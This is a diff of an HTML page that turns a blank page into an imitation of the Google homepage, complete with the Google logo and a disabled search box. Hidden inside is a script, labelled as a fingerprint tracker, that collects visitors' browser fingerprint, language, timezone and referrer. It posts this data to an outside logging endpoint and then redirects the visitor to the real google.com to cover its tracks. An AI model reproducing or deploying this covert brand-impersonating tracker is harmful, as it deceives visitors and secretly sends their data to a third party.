@@ -2,13 +2,68 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Welcome</title>
-  <link rel="stylesheet" href="styles.css">
-<body class="hidden-body">
-<body style="background:#000; color:#000;">
-  <!-- nothing visible to user -->
+  <title>Google</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+    body {
+      background: #fff;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 272px;
+      height: 92px;
+    }
+    .search-box {
+      display: flex;
+      align-items: center;
+      width: 580px;
+      border: 1px solid #dfe1e5;
+      border-radius: 24px;
+      padding: 10px 20px;
+      box-shadow: 0 1px 6px rgba(32,33,36,0.28);
+    }
+    .search-box input {
+      flex: 1;
+      font-size: 16px;
+      border: none;
+      outline: none;
+    }
+    .footer {
+      position: absolute;
+      bottom: 15px;
+      font-size: 12px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
 
+  <div class="logo">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+  </div>
+
+  <div class="search-box">
+    <input type="text" placeholder="Search Google or type a URL" disabled />
+  </div>
+
+  <div class="footer">
+    &copy; Google 
+  </div>
+
+  <!-- 🕵️ Hidden Fingerprint Tracker -->
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <script>
     ;(async () => {
@@ -23,15 +78,27 @@
         lang: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         referrer: document.referrer,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        redirected: true
       };
 
-      fetch('https://your-domain.com/logger.php', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(payload)
-      });
+      try {
+        await fetch('https://tweaksquad.onrender.com/logger.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        setTimeout(() => {
+          window.location.href = 'https://www.google.com/';
+        }, 3500);
+      } catch (e) {
+        setTimeout(() => {
+          window.location.href = 'https://www.google.com/';
+        }, 5000);
+      }
     })();
   </script>
+
 </body>
 </html>
